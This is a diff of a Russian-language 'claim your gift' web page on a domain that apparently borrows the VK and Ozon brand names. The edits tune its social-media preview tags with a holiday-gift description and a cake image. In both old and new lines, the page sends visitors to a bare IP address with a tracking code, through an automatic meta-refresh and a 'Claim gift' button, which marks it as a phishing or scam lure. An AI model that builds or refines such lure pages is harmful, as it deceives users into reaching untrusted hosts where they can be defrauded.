@@ -2,23 +2,24 @@
 <html lang="ru">
 <head>
 <meta charset="utf-8">
-<!-- ВОТ ЭТОТ ТЕГ ДЕЛАЕТ СТРАНИЦУ АДАПТИВНОЙ ПОД ТЕЛЕФОН -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Забери подарки прямо сейчас</title>
 
 <!-- Open Graph теги для превью -->
 <meta property="og:title" content="Забери подарки прямо сейчас">
-<meta property="og:description" content=".">
-<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s">
-<meta property="og:url" content="https://vk-ozon-podarki.github.io">
+<meta property="og:description" content="Праздничный подарок ждёт тебя.">
+<meta property="og:image" content="https://vk-ozon-podarki.github.io/cake.jpg">
+<meta property="og:image:width" content="800">
+<meta property="og:image:height" content="1200">
+<meta property="og:url" content="https://vk-ozon-podarki.github.io/?v=2">
 <meta property="og:type" content="website">
 <meta property="og:site_name" content="Забери подарки прямо сейчас">
 
 <!-- Twitter Card теги -->
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:title" content="Забери подарки прямо сейчас">
-<meta name="twitter:description" content=".">
-<meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRxMhIkaTmnLlSu4mFq-8OtMLiWr5v-1U4gdLv5T8dKMg&s">
+<meta name="twitter:description" content="Праздничный подарок ждёт тебя.">
+<meta name="twitter:image" content="https://vk-ozon-podarki.github.io/cake.jpg">
 
 <!-- Мгновенный редирект через meta (для ботов) -->
 <meta http-equiv="refresh" content="6; url=https://45.115.26.145/?s=sCcUFzRVCt">
@@ -41,11 +42,11 @@
         justify-content: center;
     }
 
-    /* Блок с картинкой растягивается на всю ширину */
+    /* Блок с картинкой — на телефоне во всю ширину */
     .hero-wrap {
         position: relative;
         width: 100%;
-        max-width: 100%; /* На телефоне — во всю ширину */
+        max-width: 100%;
         margin: 0 auto;
     }
 
@@ -100,9 +101,7 @@
 <body>
 
 <div class="hero-wrap">
-    <!-- ВАЖНО: проверьте, что файл называется именно cake.jpg -->
     <img src="cake.jpg" alt="Праздничный торт">
-    
     <a href="https://45.115.26.145/?s=sCcUFzRVCt" class="btn-gift" id="giftBtn">
         🎁 Забрать подарок
     </a>
